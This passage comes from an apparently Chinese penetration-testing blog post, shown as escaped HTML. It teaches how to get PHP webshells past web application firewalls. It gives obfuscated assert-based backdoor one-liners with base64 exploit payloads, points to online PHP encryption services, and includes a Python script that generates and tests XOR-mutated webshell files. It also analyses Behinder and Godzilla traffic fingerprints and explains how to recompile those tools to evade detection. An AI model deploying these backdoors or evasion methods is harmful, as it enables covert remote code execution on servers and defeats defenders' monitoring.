style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;y);&amp;amp;submit=%E6%8F%90%E4%BA%A4&lt;/p&gt;
&lt;p&gt;文件包含使用…\ …/ …\ 等&lt;/p&gt;
&lt;h3 id=&#34;权限控制对抗&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限控制对抗&#34;&gt;#&lt;/a&gt; 权限控制对抗&lt;/h3&gt;
&lt;h4 id=&#34;php-传参带入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-传参带入&#34;&gt;#&lt;/a&gt; php 传参带入&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;php木马如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;aa=&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;ert&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;aa(base64_decode(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;]));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;代码利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?a=ass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x=cGhwaW5mbygpOw==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;php-变量覆盖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-变量覆盖&#34;&gt;#&lt;/a&gt; php 变量覆盖&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;php木马如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a=&lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b=&lt;span class=&#34;string&#34;&gt;&amp;#x27;assert&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;(base64_decode(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;x&amp;#x27;&lt;/span&gt;]));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;代码利用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x=cGhwaW5mbygpOw==&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;php-加密变异&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-加密变异&#34;&gt;#&lt;/a&gt; php 加密变异&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5waHBqbS5uZXQv&#34;&gt;http://www.phpjm.net/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGhwam1zLmNvbS8=&#34;&gt;https://www.phpjms.com/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE1NzY6MTIzNC8=&#34;&gt;http://1576:1234/&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;php-异或运算&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-异或运算&#34;&gt;#&lt;/a&gt; php 异或运算&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;异或&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import threading,queue&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def string():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while not q.empty():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    filename=q.get()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    url = &amp;#x27;http://10.0.1:8081/x/&amp;#x27; + filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    datas = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#x27;x&amp;#x27;: &amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = requests.post(url, data=datas).content.decode(&amp;#x27;utf-8&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if &amp;#x27;XIAODI-PC&amp;#x27; in result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print (&amp;#x27;check-&amp;gt;&amp;#x27;+filename+&amp;#x27;-&amp;gt;ok&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      print (&amp;#x27;check-&amp;gt;&amp;#x27;+filename+&amp;#x27;-&amp;gt;no&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time.sleep(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def shell_test_check():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  url=&amp;#x27;http://0.1:8081/x/33xd6php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  datas=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;x&amp;#x27;:&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  result=requests.post(url,data=datas).content.decode(&amp;#x27;utf-8&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  print (result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if &amp;#x27;XIAODI-PC&amp;#x27; in result:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    print (&amp;#x27;ok&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q=queue.Queue()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for i in range(1, 127):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for ii in range(1, 127):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      payload = &amp;quot;&amp;#x27;&amp;quot;&amp;quot;&amp;#x27;&amp;quot; + chr(i) + &amp;quot;&amp;#x27;&amp;quot; + &amp;#x27;^&amp;#x27; + &amp;quot;&amp;#x27;&amp;quot;&amp;quot;&amp;#x27;&amp;quot; + chr(ii) + &amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      code = &amp;quot;&amp;lt;?php $a=(&amp;quot; + payload + &amp;quot;).&amp;#x27;ssert&amp;#x27;;$a($_POST[x]);?&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      filename = str(i) + &amp;#x27;xd&amp;#x27; + str(ii) + &amp;#x27;.php&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      q.put(filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      with open(&amp;#x27;D:/phpstudy/PHPTutorial/WWW/x/&amp;#x27; + filename, &amp;#x27;a&amp;#x27;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        print(&amp;#x27;Fuzz文件生成成功&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for x in range(20):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t=threading.Thread(target=string)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t.start()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;可以通过在线的接口将自己的木马再次加密，如果此加密未加入到官方的指纹系统，则还是可以绕过 waf 的。如将哥斯拉自动生成的马再次进行加密。加密后上传 webshell，仍旧可以连接成功，则可以绕。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;冰蝎哥斯拉流量分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#冰蝎哥斯拉流量分析&#34;&gt;#&lt;/a&gt; 冰蝎哥斯拉流量分析&lt;/h3&gt;
&lt;h4 id=&#34;waf绕过思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#waf绕过思路&#34;&gt;#&lt;/a&gt; waf 绕过思路&lt;/h4&gt;
&lt;p&gt;可能通过正则匹配、机器学习、行为分析等方式来绕过 waf。实战中多半是先进的安全公司的设备，必须进行魔改各种连接工具才可以绕过 waf，需要 就具体情况进行判断。&lt;/p&gt;
&lt;p&gt;webshell 利用工具的流量也可以通过 proxifer 设置代理转发至 burp 观察，实际上，proxifer 的作用就是拦截一些不能设置代理的软件，将其流量代理到自己 设置的目标端口上，目标端口可以是快代理，burp，fiddler 等可以监听端口的工具。&lt;/p&gt;
&lt;p&gt;或者不借助 proxifer 而是用 wireshark 来捕获网卡中的所有流量，通过过滤数据包来确定当前所使用工具的流量，跟随流量流，分析流量特征。&lt;/p&gt;
&lt;p&gt;如果一堆加密字符中出现了大量的 &amp;quot;/“以及不规则的大小写字母及数字组成， 则可以判断出此加密可能属于 AES; 如果有大量的等号而无”/&amp;quot; 则可以猜测属于 base64。&lt;/p&gt;
&lt;h4 id=&#34;冰蟹原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#冰蟹原理&#34;&gt;#&lt;/a&gt; 冰蟹原理&lt;/h4&gt;
&lt;p&gt;自己手动输入一个密钥，并采用 md5 加密生成 32 位字符取前 16 位作为 key 值，服务端接收客户端发送的 key 存储 session 返回客户端，客户端先将代码进 行 base64 编码，再继续发送基于 key 与偏移量 0123456789abcdef 及采用 CBC 模式的 AES 加密操作的数据包，此后服务器解密数据包进行遍历自身文件或其他 操作，并把结果再次进行一层 base64 编码及 AES 加密，客户端接受服务端发送的数据包解密后并在工具上做展示。&lt;/p&gt;
&lt;h4 id=&#34;冰蟹数据包特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#冰蟹数据包特征&#34;&gt;#&lt;/a&gt; 冰蟹数据包特征&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;User-agent：代码中定义&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Pragma: no-cache&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type：application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/ap ng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate, br&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每次冰蟹操作数据时都会发送出这几个数据，这几个数据单独来看是没有 什么特征的，但是如果合在一起使用就可以确定很大概率是冰蟹在操作，可以 认为是恶意指令。&lt;/p&gt;
&lt;p&gt;通过 wireshark 抓取冰蟹操作时的流量，分析流量特征进行捕获从而确定出 指纹；且其采用 jar 文件生成，可以反编译查找其中的指纹来源进行修订再次重 新编译成 jar 包，并修订原有指纹绕过 waf，生成一个自己专属的 webshell 连接 工具。&lt;/p&gt;
&lt;p&gt;反编译 jar 文件用 jd-jui 打开之后，如果代码中含有 php 代码是看不了的，还是需要将其导入到 IDEA 中才可以看到全部的代码。&lt;/p&gt;
&lt;h4 id=&#34;哥斯拉数据包特征&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#哥斯拉数据包特征&#34;&gt;#&lt;/a&gt; 哥斯拉数据包特征&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/0 (Windows NT 0; Win64; x64; rv:80) Gecko/20100101 Firefox/80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Language: 